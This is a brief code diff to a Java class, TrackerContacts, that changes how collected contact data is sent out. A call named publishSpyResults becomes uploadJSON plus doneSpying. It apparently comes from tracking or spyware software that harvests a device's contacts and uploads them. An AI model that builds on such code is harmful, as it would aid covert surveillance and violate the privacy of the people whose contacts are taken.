@@ -50,6 +50,8 @@ public class TrackerContacts extends TrackerMethod {
         } catch (JSONException e) {
             e.printStackTrace();
         }
-        TrackerService.publishSpyResults(this,container);
+
+        TrackerService.uploadJSON(this, container);
+        doneSpying();
     }
 }
